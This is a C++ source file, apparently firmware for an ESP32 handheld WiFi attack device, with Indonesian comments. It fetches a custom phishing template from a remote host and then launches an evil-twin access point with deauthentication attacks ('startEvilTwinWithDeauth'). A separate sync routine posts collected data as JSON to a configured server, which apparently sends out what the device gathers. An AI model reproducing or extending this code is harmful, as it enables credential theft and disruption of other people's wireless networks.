#include "cloud.h"
#include "wifi_state.h"
#include <HTTPClient.h>
int g_cloudPhase = CLOUD_PHASE_IDLE;
unsigned long g_cloudTimer = 0;
int g_tplPhase = TPL_PHASE_IDLE;
unsigned long g_tplTimer = 0;
void startCloudSync() {
  g_cloudPhase = CLOUD_PHASE_IDLE;
  tft.fillScreen(TFT_BLACK);
  drawHeader("CLOUD SYNC", TFT_DARKCYAN);
  tft.setTextFont(2);

  if (cfg_wifi_ssid.length() == 0 || cfg_server_url.length() == 0) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Not configured yet.");
    tft.setCursor(10, 60); tft.println("Isi WiFi & URL di");
    tft.setCursor(10, 80); tft.println("Web Remote > Config.");
    g_cloudPhase = CLOUD_PHASE_DONE;
    g_cloudTimer = millis();
    return;
  }

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 40); tft.print("WiFi: "); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(cfg_wifi_ssid.substring(0, 16));
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 60); tft.print("URL : "); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(cfg_server_url.substring(0, 30));
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(10, 85); tft.print("Menghubungkan...");

  radioSetMode(RADIO_STA);
  WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
  Serial.printf("[SYNC] Connect %s ...\n", cfg_wifi_ssid.c_str());
  g_cloudPhase = CLOUD_PHASE_CONNECTING;
  g_cloudTimer = millis();
}

void cloudSyncTick() {
  if (g_cloudPhase == CLOUD_PHASE_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      g_cloudPhase = CLOUD_PHASE_SENDING;
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(10, 105); tft.print("Connected. Mengirim...");
      Serial.println("[SYNC] Connected");
    } else if (millis() - g_cloudTimer > 12000) {
      Serial.println("[SYNC] WIFI CONNECT FAILED");
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 105); tft.println("WIFI CONNECT FAILED");
      WiFi.disconnect();
      radioSetMode(RADIO_STA);
      g_cloudPhase = CLOUD_PHASE_DONE;
      g_cloudTimer = millis();
    }
  } else if (g_cloudPhase == CLOUD_PHASE_SENDING) {
    String json = buildSyncJson();
    HTTPClient http;
    http.begin(cfg_server_url);
    http.addHeader("Content-Type", "application/json");
    http.addHeader("X-API-Key", SYNC_API_KEY);
    http.setTimeout(6000);
    int code = http.POST(json);
    String resp = http.getString();
    http.end();
    Serial.printf("[SYNC] HTTP %d: %s\n", code, resp.c_str());

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.fillRect(0, 105, 240, 12, TFT_BLACK);
    tft.setCursor(10, 105);
    if (code == 200) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("SEND OK"); }
    else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("FAIL HTTP " + String(code)); }

    WiFi.disconnect();
    radioSetMode(RADIO_STA);
    g_cloudPhase = CLOUD_PHASE_DONE;
    g_cloudTimer = millis();
  } else if (g_cloudPhase == CLOUD_PHASE_DONE) {
    if (millis() - g_cloudTimer > 2500) {
      g_cloudPhase = CLOUD_PHASE_IDLE;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
}

// Hentikan serangan tanpa memutus AP kontrol Web Remote
void startFetchCustomTemplate() {
  g_tplPhase = TPL_PHASE_IDLE;
  if (cfg_template_url.length() == 0 || cfg_wifi_ssid.length() == 0) {
    useCustomTemplate = false;
    selectedTemplateIdx = 0;
    currentState = EVIL_TWIN_RUNNING;
    verifyAttempts = 0;
    verifyState = 0;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
    return;
  }

  tft.fillScreen(TFT_BLACK);
  drawHeader("FETCH TEMPLATE", TFT_DARKCYAN);
  tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 40); tft.println("Mengambil template");
  tft.setCursor(10, 60); tft.println("dari hosting...");

  radioSetMode(RADIO_STA);
  WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
  g_tplPhase = TPL_PHASE_CONNECTING;
  g_tplTimer = millis();
}

void templateFetchTick() {
  if (g_tplPhase == TPL_PHASE_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      g_tplPhase = TPL_PHASE_GETTING;
    } else if (millis() - g_tplTimer > 12000) {
      WiFi.disconnect();
      radioSetMode(RADIO_STA);
      useCustomTemplate = false;
      selectedTemplateIdx = 0;
      currentState = EVIL_TWIN_RUNNING;
      verifyAttempts = 0;
      verifyState = 0;
      startEvilTwinWithDeauth();
      drawEvilTwinRunning(0);
      return;
    }
  } else if (g_tplPhase == TPL_PHASE_GETTING) {
    HTTPClient http;
    http.begin(cfg_template_url);
    http.setTimeout(6000);
    int code = http.GET();
    bool ok = false;
    if (code == 200) {
      g_customTemplate = http.getString();
      ok = g_customTemplate.length() > 0;
    }
    http.end();
    WiFi.disconnect();
    radioSetMode(RADIO_STA);

    if (ok) {
      selectedTemplateIdx = 5;
      useCustomTemplate = true;
    } else {
      useCustomTemplate = false;
      selectedTemplateIdx = 0;
    }

    currentState = EVIL_TWIN_RUNNING;
    verifyAttempts = 0;
    verifyState = 0;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
  }
}
